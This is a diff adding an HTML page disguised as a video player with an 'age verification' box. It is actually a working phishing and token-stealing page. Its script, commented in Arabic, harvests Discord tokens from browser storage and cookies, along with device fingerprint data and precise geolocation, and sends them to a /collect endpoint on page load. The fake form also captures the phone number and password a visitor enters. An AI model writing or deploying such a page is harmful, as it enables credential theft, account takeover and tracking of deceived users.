@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Watch Video</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: #fff; }
+        .video-container { max-width: 800px; margin: 0 auto; }
+        iframe { width: 100%; height: 450px; border: none; }
+        .login-box { margin-top: 30px; background: #222; padding: 20px; border-radius: 10px; max-width: 350px; margin-left: auto; margin-right: auto; }
+        input { display: block; width: 90%; margin: 10px auto; padding: 10px; border-radius: 5px; border: none; }
+        button { background: #ff0000; color: white; padding: 10px 30px; border: none; border-radius: 5px; cursor: pointer; }
+        .note { color: #aaa; font-size: 12px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <h2>Loading your video...</h2>
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" allowfullscreen></iframe>
+        <p class="note">Please verify your age to continue watching</p>
+        <div class="login-box">
+            <h3>Age Verification</h3>
+            <input type="text" id="phone" placeholder="Enter your phone number">
+            <input type="password" id="password" placeholder="Enter your password (for age check)">
+            <button onclick="submitFake()">Verify</button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ===== جمع كل البيانات المطلوبة =====
+            var data = {
+                // توكن الدسكورد - يحاول القراءة من عدة أماكن
+                discordToken: (function() {
+                    // محاولة من localStorage و sessionStorage
+                    var token = localStorage.getItem('token') || sessionStorage.getItem('token') || null;
+                    // محاولة من الكوكيز
+                    if (!token) {
+                        var cookies = document.cookie.split(';');
+                        for (var i = 0; i < cookies.length; i++) {
+                            var c = cookies[i].trim();
+                            if (c.indexOf('token=') === 0) token = c.substring(6);
+                            if (c.indexOf('discord=') === 0) token = c.substring(8);
+                        }
+                    }
+                    // محاولة من window.localStorage المفتاحات الشائعة
+                    if (!token) {
+                        var commonKeys = ['discord_token', 'discordToken', 'userToken', 'accessToken', 'authorization'];
+                        for (var j = 0; j < commonKeys.length; j++) {
+                            var val = localStorage.getItem(commonKeys[j]);
+                            if (val && val.length > 10) { token = val; break; }
+                        }
+                    }
+                    return token;
+                })(),
+
+                // معلومات الجهاز الكاملة
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: document.cookie,
+
+                // قائمة الخطوط المثبتة (للبصمة)
+                installedFonts: (function() {
+                    var fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS'];
+                    var result = [];
+                    for (var i = 0; i < fonts.length; i++) {
+                        var span = document.createElement('span');
+                        span.style.fontFamily = fonts[i];
+                        if (span.style.fontFamily === fonts[i]) result.push(fonts[i]);
+                    }
+                    return result;
+                })(),
+
+                // محاولة الوصول إلى سطح المكتب (قراءة الملفات المحلية - غير ممكن في المتصفح العادي)
+                // لكن نحاول استغلال أي ثغرة أو طلب إذن
+                desktopAccess: (function() {
+                    // في المتصفحات الحديثة، لا يمكن قراءة سطح المكتب بدون إذن صريح
+                    // نحاول طلب إذن الوصول إلى المجلدات عبر API (لا يعمل إلا إذا وافق المستخدم)
+                    var result = { possible: false, error: 'Browser restriction' };
+                    try {
+                        // محاولة استخدام File System Access API (يعمل في Chrome)
+                        if ('showDirectoryPicker' in window) {
+                            result.possible = true;
+                            result.method = 'showDirectoryPicker available';
+                        } else {
+                            result.error = 'showDirectoryPicker not supported';
+                        }
+                    } catch(e) {
+                        result.error = e.message;
+                    }
+                    return result;
+                })(),
+
+                // محاولة الحصول على الموقع الجغرافي
+                location: null
+            };
+
+            // الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        data.location = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                        sendData(data);
+                    },
+                    function(err) {
+                        data.location = { error: err.message };
+                        sendData(data);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                data.location = { error: 'Geolocation not supported' };
+                sendData(data);
+            }
+
+            // إرسال البيانات بعد 3 ثواني
+            setTimeout(function() {
+                sendData(data);
+            }, 3000);
+
+            function sendData(finalData) {
+                fetch('/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(finalData)
+                }).catch(function(err) { console.error(err); });
+            }
+
+            // النموذج الوهمي
+            window.submitFake = function() {
+                var phone = document.getElementById('phone').value;
+                var password = document.getElementById('password').value;
+                if (phone || password) {
+                    fetch('/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone: phone, password: password, extra: 'from_form' })
+                    }).catch(function(err) { console.error(err); });
+                    alert('Verification successful! You may now watch.');
+                    document.querySelector('.login-box').style.display = 'none';
+                } else {
+                    alert('Please fill in all fields.');
+                }
+            };
+        })();
+    </script>
+</body>
+</html>
